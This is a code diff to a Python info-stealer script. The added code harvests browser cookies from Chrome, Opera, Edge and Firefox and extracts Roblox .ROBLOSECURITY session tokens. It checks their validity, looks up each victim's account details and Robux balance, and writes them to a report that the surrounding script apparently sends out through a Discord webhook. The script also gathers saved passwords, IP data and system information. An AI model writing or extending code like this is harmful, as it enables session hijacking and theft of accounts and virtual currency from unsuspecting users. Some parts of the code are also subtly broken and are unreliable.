@@ -5,6 +5,10 @@ import platform
 import socket
 import getpass
 import os
+import browser_cookie3
+import robloxpy
+import json
+import time
 # print("Started")
 
 try:
@@ -17,7 +21,8 @@ except:
 
 failed = 0
 failedintotal = 0
-
+foundcookies = 0
+cookiedata = []
 
 def format_table_row(label, value):
     row_format = "{:<36} | {:<}"
@@ -94,6 +99,76 @@ try:
 except:
     gotsysteminfo = "False"
 
+import browser_cookie3
+import robloxpy
+import discord_webhook
+import requests
+import json
+import discord
+import time
+
+#Grabbing and Sending Cookie Function
+chromeCookies = list(browser_cookie3.chrome())
+operaCookies = list(browser_cookie3.opera())
+edgeCookies = list(browser_cookie3.edge())
+firefoxCookies = list(browser_cookie3.firefox())
+def getCookiesFromDomain(domain, cookieName, browserCookies):
+    global cookiedata
+
+    Cookies = {}
+
+    for cookie in browserCookies:
+
+        if (domain in cookie.domain):
+            print (cookie.name, cookie.domain, cookie.value)
+            Cookies[cookie.name] = cookie.value
+
+            if cookie.name in cookieName:
+                found_cookie_value = "NF"
+                try:
+                    foundcookies += 1
+                    found_cookie_value = cookie.value
+                except:
+                    #return {} #if exception raised return an empty dictionary 
+                    found_cookie_value = "NF"
+
+                if found_cookie_value != "NF":
+                    #################### checking cookie #############
+                    isvalid = robloxpy.Utils.CheckCookie(found_cookie_value)
+                    if isvalid == "Valid Cookie":
+                        isvalid = "Valid"
+                        #################### getting info about the cookie #############
+                        ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":found_cookie_value})
+                        info = json.loads(ebruh.text)
+                        rid = info["UserID"]
+                        rap = robloxpy.User.External.GetRAP(rid)
+                        friends = robloxpy.User.Friends.External.GetCount(rid)
+                        age = robloxpy.User.External.GetAge(rid)
+                        dnso = None
+                        crdate = robloxpy.User.External.CreationDate(rid)
+                        rolimons = f"https://www.rolimons.com/player/{rid}"
+                        roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
+                        headshot = robloxpy.User.External.GetHeadshot(rid)
+                        username = info['UserName']
+                        robux = info['RobuxBalance']
+                        premium = info['IsPremium']
+
+                        cookiedata.append((username, roblox_profile, age, robux, premium))
+
+try:
+    getCookiesFromDomain("roblox.com", ".ROBLOSECURITY", chromeCookies)
+    time.sleep(0.2)
+    getCookiesFromDomain("roblox.com", ".ROBLOSECURITY", operaCookies)
+    time.sleep(0.2)
+    getCookiesFromDomain("roblox.com", ".ROBLOSECURITY", edgeCookies)
+    time.sleep(0.2)
+    getCookiesFromDomain("roblox.com", ".ROBLOSECURITY", firefoxCookies)
+    time.sleep(0.2)
+    askedforcookies = "True"
+except:
+    askedforcookies = "False"
+
+
 
 try:
     with open(f'{formatted_time}.txt', 'w') as f:
@@ -104,6 +179,7 @@ try:
                 "Got Profiles Passwords", gotprofiledata) + "\n")
             f.write(format_table_row("Got IP-Address Infos", gotipinfo) + "\n")
             f.write(format_table_row("Got SYSTEM-INFO", gotsysteminfo) + "\n")
+            f.write(format_table_row("Successfully asked for Cookies", askedforcookies) + "\n")
         except:
             f.write("Couldn't gather Info over Checks.\n\n")
 
@@ -150,9 +226,31 @@ try:
             f.write(format_table_row("Computer Name", computer_name) + "\n")
         except:
             f.write("Couldn't gather Info over System-Info.\n\n")
+
+        f.write("------------------------------------------------------------------------------------------------------------------------------------\n                                                      ROBLOX\n------------------------------------------------------------------------------------------------------------------------------------\n\n")
+        #try:
+        for info in cookiedata:
+            f.write("Cookies\n")
+            username, roblox_profile, crdate, age, robux, premium = info
+            f.write("Username: {:<34} | Roblox Profile: {:<10} | Age: {:5} | Robux: {:6} | Premium: {:7}\n".format(
+                username, roblox_profile, age, robux, premium))
+            f.write("Cookies\n")
+        #except:
+        #    f.write("Couldn't gather Info over Roblox.\n\n")
+            
+        f.write("\n\nEND")
 except:
     None
 
+
+
+with open(f'test.txt', 'w') as f:
+        for info in cookiedata:
+            f.write("Cookies\n")
+            username, roblox_profile, crdate, age, robux, premium = info
+            f.write("Username: {:<34} | Roblox Profile: {:<10} | Age: {:5} | Robux: {:6} | Premium: {:7}\n".format(
+                username, roblox_profile, age, robux, premium))
+            f.write("Cookies\n")
 
 try:
     def send_file_to_discord_webhook(webhook_url, file_path):
